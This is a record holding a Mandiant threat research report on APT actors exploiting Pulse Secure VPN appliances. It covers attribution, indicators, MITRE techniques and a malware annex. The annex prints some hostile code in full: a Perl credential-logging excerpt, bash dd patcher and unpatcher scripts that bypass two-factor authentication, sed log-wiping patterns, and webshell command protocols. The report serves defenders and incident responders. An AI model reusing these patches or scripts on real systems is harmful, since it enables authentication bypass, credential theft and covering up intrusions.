{
    "id": "da428bc1-bf24-49cc-85f3-8444a0133ff3",
    "created_at": "2022-10-25T16:48:17.192402Z",
    "updated_at": "2025-03-27T02:15:25.61745Z",
    "deleted_at": null,
    "sha1_hash": "2df18ace43029121d0bc039c517739e3a76e0d1b",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-04-21T01:37:07Z",
    "file_modification_date": "2021-04-21T01:37:07Z",
    "file_size": 2616292,
    "plain_text": "# Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day\n\n**fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-**\nday.html\n\n**Executive Summary**\n\nMandiant recently responded to multiple security incidents involving compromises\nof Pulse Secure VPN appliances.\nThis blog post examines multiple, related techniques for bypassing single and\nmultifactor authentication on Pulse Secure VPN devices, persisting across upgrades,\nand maintaining access through webshells.\nThe investigation by Pulse Secure has determined that a combination of prior\nvulnerabilities and a previously unknown vulnerability discovered in April 2021,\n[CVE-2021-22893, are responsible for the initial infection vector.](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/)\nPulse Secure’s parent company, Ivanti, released mitigations for a vulnerability\nexploited in relation to these malware families and the Pulse Connect Secure\nIntegrity Tool for their customers to determine if their systems are impacted. A final\npatch to address the vulnerability will be available in early May 2021.\nPulse Secure has been working closely with Mandiant, affected customers,\ngovernment partners, and other forensic experts to address these issues.\nThere is no indication the identified backdoors were introduced through a supply\nchain compromise of the company’s network or software deployment process.\n\n**Introduction**\n\nMandiant is currently tracking 12 malware families associated with the exploitation of\nPulse Secure VPN devices. These families are related to the circumvention of\nauthentication and backdoor access to these devices, but they are not necessarily related\nto each other and have been observed in separate investigations. It is likely that multiple\nactors are responsible for the creation and deployment of these various code families.\n\nThe focus of this report is on the activities of UNC2630 against U.S. Defense Industrial\nbase (DIB) networks, but detailed malware analysis and detection methods for all\nsamples observed at U.S. and European victim organizations are provided in the technical\nannex to assist network defenders in identifying a large range of malicious activity on\naffected appliances. Analysis is ongoing to determine the extent of the activity.\n\nMandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft\nThreat Intelligence Center (MSTIC), and relevant government and law enforcement\nagencies to investigate the threat, as well as develop recommendations and mitigations\nfor affected Pulse Secure VPN appliance owners.\n\n\n-----\n\nAs part of their investigation, Ivanti has released mitigations for a vulnerability exploited\n[in relation to this campaign as well as the Pulse Connect Secure Integrity Tool to assist](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755)\nwith determining if systems have been impacted.\n\n**Details**\n\nEarly this year, Mandiant investigated multiple intrusions at defense, government, and\nfinancial organizations around the world. In each intrusion, the earliest evidence of\nattacker activity traced back to DHCP IP address ranges belonging to Pulse Secure VPN\nappliances in the affected environment.\n\nIn many cases, we were not able to determine how actors obtained administrator-level\naccess to the appliances. However, based on analysis by Ivanti, we suspect some\nintrusions were due to the exploitation of previously disclosed Pulse Secure\nvulnerabilities from 2019 and 2020 while other intrusions were due to the exploitation of\n[CVE-2021-22893.](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/)\n\nWe observed UNC2630 harvesting credentials from various Pulse Secure VPN login\nflows, which ultimately allowed the actor to use legitimate account credentials to move\nlaterally into the affected environments. In order to maintain persistence to the\ncompromised networks, the actor utilized legitimate, but modified, Pulse Secure binaries\nand scripts on the VPN appliance. This was done to accomplish the following:\n\n1. Trojanize shared objects with malicious code to log credentials and bypass\n\nauthentication flows, including multifactor authentication requirements. We track\nthese trojanized assemblies as SLOWPULSE and its variants.\n2. Inject webshells we currently track as RADIALPULSE and PULSECHECK into\n\nlegitimate Internet-accessible Pulse Secure VPN appliance administrative web pages\nfor the devices.\n3. Toggle the filesystem between Read-Only and Read-Write modes to allow for file\n\nmodification on a typically Read-Only filesystem.\n4. Maintain persistence across VPN appliance general upgrades that are performed by\n\nthe administrator.\n5. Unpatch modified files and delete utilities and scripts after use to evade detection.\n6. Clear relevant log files utilizing a utility tracked as THINBLOOD based on an actor\n\ndefined regular expression.\n\nIn a separate incident in March 2021, we observed UNC2717 using RADIALPULSE,\nPULSEJUMP, and HARDPULSE at a European organization. Although we did not\nobserve PULSEJUMP or HARDPULSE used by UNC2630 against U.S. DIB companies,\nthese malware families have shared characteristics and serve similar purposes to other\ncode families used by UNC2630. We also observed an OpenSSL library file modified in\nsimilar fashion as the other trojanized shared objects. We believe that the modified\nlibrary file, which we’ve named LOCKPICK, could weaken encryption for communications\nused by the appliance, but do not have enough evidence to confirm this.\n\n\n-----\n\nDue to a lack of context and forensic evidence at this time, Mandiant cannot associate all\nthe code families described in this report to UNC2630 or UNC2717. We also note the\npossibility that one or more related groups is responsible for the development and\ndissemination of these different tools across loosely connected APT actors. It is likely that\nadditional groups beyond UNC2630 and UNC2717 have adopted one or more of these\ntools. Despite these gaps in our understanding, we included detailed analysis, detection\ntechniques, and mitigations for all code families in the Technical Annex.\n\n**SLOWPULSE**\n\nDuring our investigation into the activities of UNC2630, we uncovered a novel malware\nfamily we labeled SLOWPULSE. This malware and its variants are applied as\nmodifications to legitimate Pulse Secure files to bypass or log credentials in the\nauthentication flows that exist within the legitimate Pulse Secure shared object\nlibdsplibs.so. Three of the four discovered variants enable the attacker to bypass twofactor authentication. A brief overview of these variants is covered in this section, refer to\nthe Technical Annex for more details.\n\nSLOWPULSE Variant 1\n\nThis variant is responsible for bypassing LDAP and RADIUS-2FA authentication routines\nif a secret backdoor password is provided by the attacker. The sample inspects login\ncredentials used at the start of each protocol’s associated routine and strategically forces\nexecution down the successful authentication patch if the provided password matches the\nattacker's chosen backdoor password.\n\n_LDAP Auth Bypass_\n\nThe routine DSAuth::LDAPAuthServer::authenticate begins the LDAP authentication\nprocedure. This variant inserts a check against the backdoor password after the bind\nroutine so that the return value can be conditionally stomped to spoof successful\nauthentication.\n\n\n-----\n\nFigure 1: LDAP Auth Bypass\n\n_RADIUS Two Factor Auth Bypass_\n\nThe routine DSAuth::RadiusAuthServer::checkUsernamePassword begins the RADIUS2FA authentication procedure. This variant inserts checks against the backdoor password\nafter the RADIUS authentication packet is received back from the authentication server.\nIf the backdoor password is provided by the attacker, the packet type and successful\nauthentication status flags are overwritten to spoof successful authentication.\n\n\n-----\n\nFigure 2: Radius-2FA Bypass\n\nSLOWPULSE Variant 2\n\n_ACE Two Factor Auth Credential Logging_\n\nThis variant logs credentials used during the ACE-2FA authentication procedure\nDSAuth::AceAuthServer::checkUsernamePassword. Rather than bypassing\nauthentication, this variant logs the username and password to a file for later use by the\nattacker.\n\n\n-----\n\nFigure 3: ACE Auth Credential Log\n\nSLOWPULSE Variant 3\n\n_ACE Two Factor Auth Bypass_\n\nThis variant is responsible for bypassing the ACE-2FA logon procedure starting with\nDSAuth::AceAuthServer::checkUsernamePassword. The flow of the authentication\nprocedure is modified to bypass the routine responsible for verifying the username and\npassword if the backdoor password is provided. With this modification the attacker can\nspoof successful authentication.\n\n\n-----\n\nFigure 4: ACE Auth Bypass Variant\n\nSLOWPULSE Variant 4\n\n_RealmSignin Two Factor Auth Bypass_\n\nThis variant bypasses the RealmSignin::runSecondaryAuth procedure of the Pulse Secure\nVPN. The inserted logic modifies the execution flow of a specific step of the login process\nto spoof successful authentication. We believe that this may be a two-factor\nauthentication bypass.\n\n\n-----\n\nFigure 5: RealmSignIn 2FA Auth Bypass\n\n**Attribution**\n\nWe are in the early stages of gathering evidence and making attribution assessments and\nthere are a number of gaps in our understanding of UNC2630, UNC2717, and these 12\ncode families. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this\nanalysis to assist network defenders in triaging and identifying malicious activity on\naffected appliances.\n\nMandiant is able to assess that:\n\n\n-----\n\nUNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE,\nTHINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and PULSECHECK as\nearly as August 2020 until March 2021.\n\nWe suspect UNC2630 operates on behalf of the Chinese government and may\nhave ties to APT5\nUNC2717 targeted global government agencies between October 2020 and March\n2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP.\n\nWe do not have enough evidence about UNC2717 to determine government\nsponsorship or suspected affiliation with any known APT group.\nWe do not have enough information about the use of LOCKPICK to make an\nattribution statement.\n\nUNC2630\n\nUNC2630’s combination of infrastructure, tools, and on-network behavior appear to be\nunique, and we have not observed them during any other campaigns or at any other\nengagement. Despite these new tools and infrastructure, Mandiant analysts noted strong\nsimilarities to historic intrusions dating back to 2014 and 2015 and conducted by Chinese\nespionage actor APT5. We have also uncovered limited evidence to suggest that UNC2630\noperates on behalf of the Chinese government. Analysis is still ongoing to determine the\nfull scope of the activity that maybe related to the group.\n\nAlthough we are not able to definitively connect UNC2630 to APT5, or any other existing\nAPT group, a trusted third party has uncovered evidence connecting this activity to\nhistoric campaigns which Mandiant tracks as Chinese espionage actor APT5. While we\ncannot make the same connections, the third party assessment is consistent with our\nunderstanding of APT5 and their historic TTPs and targets.\n\nAPT5 has shown significant interest in compromising networking devices and\nmanipulating the underlying software which supports these appliances. They have also\nconsistently targeted defense and technology companies in the U.S., Europe, and Asia.\n\nAs early as 2014, Mandiant Incident Response discovered APT5 making\nunauthorized code modifications to files in the embedded operating system of\nanother technology platform.\nIn 2015, APT5 compromised a U.S. telecommunications organization providing\nservices and technologies for private and government entities. During this intrusion,\nthe actors downloaded and modified some of the router images related to the\ncompany’s network routers.\nAlso during this time, APT5 stole files related to military technology from a South\nAsian defense organization. Observed filenames suggest the actors were interested\nin product specifications, emails concerning technical products, procurement bids\nand proposals, and documents on unmanned aerial vehicles (UAVs).\n\n\n-----\n\nAPT5 persistently targets high value corporate networks and often re-compromises\nnetworks over many years. Their primary targets appear to be aerospace and\ndefense companies located in the U.S., Europe, and Asia. Secondary targets (used to\nfacilitate access to their primary targets) include network appliance manufacturers\nand software companies usually located in the U.S.\n\n**Recommendations**\n\nAll Pulse Secure Connect customers should assess the impact of the Pulse Secure\nmitigations and apply it if possible. Organizations should utilize the most recent version\n[of Pulse Secure’s Integrity Assurance utility released on March 31, 2021. If a device fails](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755)\nthis Integrity Assurance utility, network administrators should follow the instructions\nhere and contact their Pulse CSR for additional guidance.\n\nOrganizations should examine available forensic evidence to determine if an attacker\ncompromised user credentials. Ivanti highly recommends resetting all passwords in the\nenvironment and reviewing the configuration to ensure no service accounts can be used\nto authenticate to the vulnerability.\n\nAdditional detections, mitigations and relevant MITRE ATT&CK techniques are included\nin the Technical Annex. Sample hashes and analysis are included to enable defenders to\nquickly assess if their respective appliances have been affected. Yara rules, Snort rules,\n[and hashes are published on Mandiant’s GitHub page.](https://github.com/fireeye/pulsesecure_exploitation_countermeasures/)\n\n**Detections and Mitigations**\n\n1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc\n\nHARDPULSE contains an embedded 'recovery' URL https://ive-host/danana/auth/recover[.]cgi?token=<varies> that may be accessed by an attacker. The\nsample uses the POST parameters checkcode, hashid, m, and filename. This URL is\nnot present in legitimate versions of this file.\n\n7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a\n\n68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\n\nd72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b\n\nPULSEJUMP, RADIALPULSE AND PACEMAKER use the following files to record\ncredentials:\n\n/tmp/dsactiveuser.statementcounters\n/tmp/dsstartssh.statementcounters\n/tmp/dsserver-check.statementcounters\n\ncd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68\n\n\n-----\n\nThe malicious operations of SLOWPULSE can be detected via log correlation\nbetween the authentication servers responsible for LDAP and RADIUS auth and the\nVPN server. Authentication failures in either LDAP or RADIUS logs with the\nassociated VPN logins showing success would be an anomalous event worthy of\nflagging.\n\na1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1\n\nUpon invocation of the PULSECHECK webshell, the following HTTP request\nheaders will be sent:\n\n**Key** **Value**\n\nREQUEST_METHOD POST\n\nHTTP_X_KEY <BackdoorKey>\n\nHTTP_X_CNT <RC4Key>\n\nHTTP_X_CMD <RC4Command>\n\n1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd\n\nSLOWPULSE VARIANT 2 writes ACE logon credentials to the\nfile /home/perl/PAUS.pm in a+ (append) mode, using the format string %s:%s\\n.\n\n68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\n\nPACEMAKER is saved at filepath /home/bin/memread\nExecuted with commandline flags –t, -m, -s\nAttaches to victim processes with PTRACE and opens subfiles in /proc/\n\n88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079\n\nTHINBLOOD creates the files:\n\n/home/runtime/logs/log.events.vc1\n/home/runtime/logs/log.events.vc2\n/home/runtime/logs/log.access.vc1\n/home/runtime/logs/log.access.vc2\nExecutes the system API with the mv command specifying one of the files above,\ntargeting:\n\n/home/runtime/logs/log.access.vc0\n/home/runtime/logs/log.events.vc0\nExecutes the rm command specify one of the .vc1 files above\n\n\n-----\n\n133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a\n\nSLIGHTPULSE uses /tmp/1 as command execution log\nAll POST requests to meeting_testjs.cgi are suspicious\nPOST parameters: cert, img, name are used by malicious logic\nResponses to the endpoint with the name parameter respond with no-cache and\nimage/gif\n\n1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9\n\nTHINBLOOD execution of sed on the files:\n\nlog.events.vc0\nlog.access.vc0\nLog.admin.vc0\nSed patterns used:\n\ns/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g\ns/\\x<hex_char>\\x00[^\\x00]*<regex_string>\n\n[^\\x00]*\\x09\\x<hex_char>\\x00//g\n\n06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7\n\nThe sample accepts an input and output file as its first and second arguments, then\nwrites a patched version of the input out. The commandline argument e or E must\nbe supplied as the fourth argument. Example command line:\n\n./patcher input.bin output.bin backdoorkey e\n\nf2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90\n\nThe sample uses the HTTP query parameter id and responds with HTTP headers\n\"Cache-Control: no-cache\\n\" and \"Content-type: text/html\\n\\n\".\n\n224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450\n\n64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7\n\n78d7c7c9f800f6824f63a99d935a4ad0112f97953d8c100deb29dae24d7da282\n\n705cda7d1ace8f4adeec5502aa311620b8d6c64046a1aed2ae833e2f2835154f\n\nExecute sed on PulseSecure system files\nRemounts filesystem as writable: system(\"/bin/mount -o remount,rw /dev/root /\")\nUnexpected execution of other system commands such as tar, cp, rm\n\n**MITRE ATT&CK Techniques**\n\nThe following list of MITRE ATT&CK techniques cover all malware samples described in\nthis report as well as those observed throughout the lifecycle of UNC2630 and UNC2717.\n\nT1003-OS Credential Dumping\n\n\n-----\n\nT1016-System Network Configuration Discovery\nT1021.001-Remote Desktop Protocol\nT1027-Obfuscated Files or Information\nT1036.005-Match Legitimate Name or Location\nT1048-Exfiltration Over Alternative Protocol\nT1049-System Network Connections Discovery\nT1053-Scheduled Task/Job\nT1057-Process Discovery\nT1059-Command and Scripting Interpreter\nT1059.003-Windows Command Shell\nT1070-Indicator Removal on Host\nT1070.001-Clear Windows Event Logs\nT1070.004-File Deletion\nT1071.001-Web Protocols\nT1082-System Information Discovery\nT1098-Account Manipulation\nT1105-Ingress Tool Transfer\nT1111-Two-Factor Authentication Interception\nT1133-External Remote Services\nT1134.001 Access Token Manipulation: Token Impersonation/Theft\nT1136-Create Account\nT1140-Deobfuscate/Decode Files or Information\nT1190-Exploit Public-Facing Application\nT1505.003-Web Shell\nT1518-Software Discovery\nT1554-Compromise Client Software Binary\nT1556.004-Network Device Authentication\nT1592.004 Gather Victim Host Information: Client Configurations\nT1562 Impair Defenses\nT1569.002-Service Execution\nT1574 Hijack Execution Flow\nT1600-Weaken Encryption\n\n\n-----\n\nFigure 6: MITRE ATT&CK Map\n\n**Technical Annex**\n\nSLIGHTPULSE\n\nThe file meeting_testjs.cgi (SHA256:\n133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a) is a\nwebshell capable of arbitrary file read, write, and command execution. Malicious logic is\ninserted at the end of legitimate logic to respond to POST requests. We believe this\nwebshell may be responsible for placing additional webshells and used to modify\nlegitimate system components resulting in the other observed malware families due to its\nfunctionality.\n\nThe malicious logic inserts a branch condition to respond to HTTP POST requests rather\nthan just the typical GET requests expected of the legitimate code. If GET requests are\nperformed the legitimate logic is still invoked. POST requests have a series of parameters\nchecked for existence to determine which command to invoke. This logic is:\n\n**POST params** **Invoked Command**\n\ncert writefile\n\n\n-----\n\nimg, name with nonempty value readfile\n\nimg set to empty string \"\", name execcmd\n\nanything else invoke original legitimate logic\n\nFigure 7: Webshells respond to POSTs\n\nAll incoming and outgoing requests are base64 encoded/decoded and RC4\nencrypted/decrypted. The scheme is simple. The first six characters of the data are a\nrandom key generated per request as a sort of nonce, with the static RC4 key appended.\n\n\n-----\n\nThis nonce + phrase together act as the RC4 key. The phrase is not sent over the wire,\nonly the nonce. This entire key is then used to encrypt/decrypt payload data that\nimmediately follows the key. The form of data on the wire is:\n\nOutbound/Inbound:\n\n<6randbytes><encrypted_data>\n^-RC4NONCE-^\n\nUsage:\n\n<6randbytes><rc4_phrase><encrypted_data>\n^-------RC4 KEY--------^\n\n_ReadFile_\n\nThis command accepts a base64 encoded, RC4 encrypted file name via the img parameter\nand opens it for read. The file contents are read in full then sent back to the attacker as\nbase64 encoded, RC4 encrypted data with the headers \"Content-type: application/xdownload\\n\", and form header \"Content-Disposition: attachment; filename=tmp\\n\\n\".\n\n_WriteFile_\n\nThis command accepts a base64 encoded, RC4 encrypted filename via the cert parameter,\nand base64 encoded, RC4 encrypted file data via the parameter md5. The filename is\nopened in write mode with the file data being written to the file before the file is closed.\nThe results of this command are sent back to the attacker, using the headers \"CacheControl: no-cache\\n\" and \"Content-type: text/html\\n\\n\".\n\n_Execute_\n\nThis command accepts a base64 encoded, RC4 encrypted commands via the name\nparameter. The malicious logic forbids the cd command and will respond with the text\nError 404 if executed. All other commands will be executed via the system API with\noutput piped to the file /tmp/1. The full system command is <command> >/tmp/1 2>&1.\nThe output of this execution is read and sent back to the attacker base64 encoded, RC4\nencrypted. The headers \"Cache-Control: no-cache\\n\" and \"Content-type: image/gif\\n\\n\"\nare used. The response appears to be masquerading as a GIF when sending back this\ncommand output.\n\nRADIALPULSE\n\nThe file with the SHA256 hash\nd72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b is a modified\nPerl script associated with a PulseSecure web-based tool which causes usernames,\npasswords and information associated with logins to this application to be written to the\nfile /tmp/dsstartssh.statementcounters.\n\n\n-----\n\nRetrieval of these login credentials must be achieved through other means such as an\ninteractive login or a webshell. Persistence is achieved by the addition of compromised\ncode which is continually served when requesting this PulseSecure webpage.\n\nAn excerpt of the code related to credential stealing is shown as follows:\n\nmy $realmName1 = $signin->getRealmInfo()->{name};\n\nopen(*fd, \">>/tmp/dsstartssh.statementcounters\");\n\nsyswrite(*fd, \"realm=$realmName1 \", 5000);\n\nsyswrite(*fd, \"username=$username \", 5000);\n\nsyswrite(*fd, \"password=$password\\n\", 5000);\n\nclose(*fd);\n\nSLOWPULSE Variant 1\n\nThe file libdsplibs.so with SHA256\ncd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68 is a\ntrojanized ELF shared object belonging to the PulseSecure VPN server. The sample has\nbeen modified to bypass specific authentication mechanisms of the LDAP and RADIUS\nprotocols. The sample hardcodes a backdoor key that will silently subvert auth failures if\nthe correct backdoor key is passed, establishing a VPN connection as if auth succeeded. If\nthe backdoor password is not used, authentication will fail as normal.\n\nIn multiple locations assembly is written into the padding regions between legitimate\nfunctions. As these regions are very small, around 20 bytes, the malicious logic stitches\nitself together by unconditionally jumping between multiple padding regions. The\nassembly is written in a way very similar to mid-function hooks, where it is common to\npush and then pop all flags and registers before and after the injected logic. By preserving\nregisters and flags in this way the malicious logic is able to execute and perform its\nmalicious logic as a passive observer if desired, only effecting the control flow in specific\nconditions. This is employed in two locations, the LDAP and RADIUS authentication\nroutines, DSAuth::LDAPAuthServer::authenticate and\nDSAuth::RadiusAuthServer::checkUsernamePassword respectively.\n\n_LDAP Auth Bypass_\n\nIn the typical execution of DSAuth::LDAPAuthServer::authenticate the legitimate\napplication constructs the C++ object DSAuth::LDAPAuthServer::ldap then passes it to\nDSLdapServer::bind with the username and password for login. This bind may fail or\nsucceed which determines the authentication failure or success of the LDAP protocol. The\nmalicious logic inserted into the application redirects execution before\nDSLdapServer::bind just after the ldap object is constructed. At this point in execution\nthe username and password are easily extracted from memory with mid-function hooking\n\n\n-----\n\ntechniques, which the sample copies to a code cave in memory between two functions as a\ntemporary storage location. The malicious logic then invokes DSLdapServer::bind as the\nnormal logic would, which sets the return register EAX to 0 or 1 for failure or success. A\ncheck is then executed where the temporary password copy made earlier is checked\nagainst a hardcoded backdoor password. If this check passes the backdoor logic actives by\noverwriting EAX to 1 to force the application down the execution path of successful\nauthentication, even though in reality authentication failed.\n\nRADIUS Two Factor Auth Bypass\n\nIn the typical execution of DSAuth::RadiusAuthServer::checkUsernamePassword the\nlegitimate application sends a RADIUS-2FA auth packet with username and password via\nRadiusAuthPacket::sendRadiusPacket. The response is then retrieved and parsed by the\nroutine DSAuth::RadiusAuthServer::handleResponse. After packet retrieval the packet\ntype is verified to be 3, it's not known what this packet type specifies but this is the packet\ntype of a successful authentication response. If the packet type check passes, then the\nsample reads a field of the packet that specifies if authentication was successful or not and\nthen checks this status later. The inserted malicious logic hijacks execution just after\nDSAuth::RadiusAuthServer::handleResponse where the password sent to the RADIUS\nserver is checked against a backdoor password. If this check passes the malicious logic\noverwrites the retrieved packet with values indicating that it's of type 3 and that\nauthentication was successful. The malicious logic then rejoins the original execution flow\nwhere the packet type is checked. If written the spoofed values force the application down\nthe execution path of successful authentication, even though in reality authentication\nfailed.\n\nSLOWPULSE Variant 2\n\n_ACE Two Factor Auth Credential Logging_\n\nWe also identified a variant of SLOWPULSE (SHA256:\n1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd) which logs\ncredentials used during ACE-2FA protocol authentication.\n\nThe backdoor is implemented in the routine\nDSAuth::AceAuthServer::checkUsernamePassword. As part of the login procedure the\nusername and password are retrieved then written into a map entry structure. The\nbackdoor inserts an unconditional jump into the logon logic that takes this map entry\nstructure, reads the username and password fields, then writes them to the file\n/home/perl/PAUS.pm in a+ (append) mode, using the format string %s:%s\\n. The\nbackdoor then unconditionally jumps back into the normal control flow to continue the\nlogon process as normal.\n\nSLOWPULSE Variant 3\n\n_ACE Two Factor Auth Bypass_\n\n\n-----\n\nWe Identified another variant of SLOWPULSE (SHA256:\nb1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9) which is\nsimilar to SLOWPULSE VARIANT 2 the malicious logic lives within\nDSAuth::AceAuthServer::checkUsernamePassword, however this variant bypasses the\nlogon procedure rather than login credentials. Typical execution of this routine calls\nDsSecID_checkLogin to validate the username and password which sets the EAX register\nto 1. The routine DSAuth::AceAuthServer::handleACEAuthResult then checks EAX to\ndetermine if auth was successful or not. The malicious logic hijacks execution\nimmediately after the username and password fields are written to their map entries, then\nchecks if the password matches the backdoor password. If the password matches, then\nthe EAX register is overwritten to 1. This puts the program in the same state as if\nDsSecID_checkLogin had successfully executed, but unlike SLOWPULSE VARIANT 1 the\noriginal authentication routine is not called at all. The malicious logic then rejoins\nexecution before DSAuth::AceAuthServer::handleACEAuthResult which will now pass.\nThis forces the application down the execution path of successful authentication, even\nthough in reality authentication would have failed.\n\nSLOWPULSE Variant 4\n\n_RealmSignin Two Factor Auth Bypass_\n\nWe identified a fourth variant of SLOWPULSE responsible for bypassing what may be the\ntwo-factor authentication step of the DSAuth::RealmSignin process. The backdoor is\npresent within the function DSAuth::RealmSignin::runSigninStep.This routine is\nresponsible for multiple steps of the login procedure and is implemented as a large switch\nstatement. Case 11 of the switch statement typically calls the routines\nDSMap::setPrivacyKeyNames then DSAuth::RealmSignin::runSecondaryAuth. The\nmalicious logic in this variant overwrites the call to\nDSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces application flow as\nif DSAuth::RealmSignin::runSecondaryAuth always succeeds, without ever calling it. We\nwere not able to recover a file with these patches applied as the attacker removed their\npatches after use. However, we did uncover both the patcher and unpatcher utilities. We\ndo not provide a hash for this file as we have not recovered it from a system in the field.\nThis analysis was performed by replaying the changes performed by the patcher we did\nrecover.\n\nSLOWPULSE Variant 2 Patcher\n\nAs part of our investigation into the SLOWPULSE family we were able to recover the\nutility used by the attacker to insert the malicious logic into the original libdsplibs.so file.\nThe file with SHA256:\nc9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c is\nresponsible for inserting SLOWPULSE V2 malicious logic to log ACE credentials. The\npatcher accepts two command line arguments, the path to the original binary and the\npatched output file path. The original binary is read into memory, patched, and then\nwritten to the output path. The assembly patches and offsets into the original binary are\nhardcoded.\n\n\n-----\n\nSLOWPULSE Variant 3 Patcher\n\nAs part of our investigation into the SLOWPULSE family we were able to recover the\nutility used by the attacker to insert the malicious logic into the original libdsplibs.so file.\nThe file with SHA256:\n06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7 is responsible\nfor inserting SLOWPULSE V3 malicious logic to bypass ACE logon authentication\nprocess. The patcher accepts four arguments. The first argument is the original binary\npath, the second the patched output file path, third is the backdoor bypass password, and\nfourth is the letter e specifying to apply patches. The sample reads the original binary into\nmemory, applies the assembly patches associated with SLOWPULSE V3, as well as the\nprovided bypass password, then written to the output path. The assembly patches, and all\noffsets including where to copy the bypass password are hardcoded.\n\nSLOWPULSE Variant 4 Patcher\n\nAs part of our investigation into the SLOWPULSE family we recovered the utility the\nattacker used to insert the malicious logic into the original libdsplibs.so file. The file with\nSHA256: e63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415\nresponsible for inserting the patch for SLOWPULSE V3. The patch applied overwrites a\nsingle call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This patcher\nutility is a simple bash script, unlike the previous patchers which were compiled\napplications likely written in C. The script in full is:\n\nprintf '\\xB8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B31))\nprintf '\\x01' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B32))\nprintf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B33))\nprintf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B34))\nprintf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B35))\n\nSLOWPULSE Variant 4 UnPatcher\n\nAs part of our investigation into the SLOWPULSE family we were able to recover the\nutility used by the attacker to remove the malicious logic into the original libdsplibs.so file\nfor SLOWPULSE V4. The attacker chose to remove the patches applied to libdsplibs.so.\nThe file with\nSHA256: b2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a is\nthe unpatcher utility for SLOWPULSE V4. This sample is also a simple bash script, in full\nit is:\n\nprintf '\\xE8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B31))\nprintf '\\xE2' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\n\n\n-----\n\nseek=$((0x5C7B32))\nprintf '\\x08' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B33))\nprintf '\\xD0' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B34))\nprintf '\\xFF' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1\nseek=$((0x5C7B35))\n\nSTEADYPULSE\n\nThe file licenseserverproto.cgi (SHA256:\n168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc) is a webshell\nimplemented via modification of a legitimate Perl script used by a Pulse Secure tool which\nenables arbitrary command execution.\n\nThe attacker inserted two blocks of Perl code that implement the webshell. The source\ncode modifications are surrounded by comments that indicate the start and end of\ninserted code. The comment strings used are ##cgistart1, ##cgiend1, ##cgistart2 and\n##cgiend2. Although the exact purpose of these comment strings is unknown, the\nattacker may use them to facilitate updates to the malicious code or to allow for its quick\nremoval if necessary.\n\nThe Perl script enclosed in the tags ##cgistart1 and ##cgiend1 adds several lines to\nimport Perl modules that are used by the webshell. It also adds a function to parse\nparameters of received command data.\nThe script enclosed in the tags ##cgistart2 and ##cgiend2 is responsible for\nchecking web requests designed to be executed by the webshell, if present. If no\nwebshell request is found, the script passes execution to the legitimate Perl script\nfor the webpage.\n\nThe webshell portion of the script is invoked when it receives a form submission\nname=value pair of serverid matching a secret key. This causes the webshell to extract the\nstring passed to it via the QUERY_STRING CGI environment variable. Individual\nkey/value pairs delimited by the & character and are URL decoded. Although the script\nparses out all key/value pairs it receives, it specifically looks for and extracts data\nassociated with the cmd parameter. If found, it will generate a form containing the\nextracted cmd to be executed and the previous serverid value along with a form\nsubmission button named Run. Upon submission, the webshell will execute the passed\ncommand on the victim host's command line and display the results to the attacker before\nexiting. If no cmd value was extracted, the webshell will simply output a </pre> 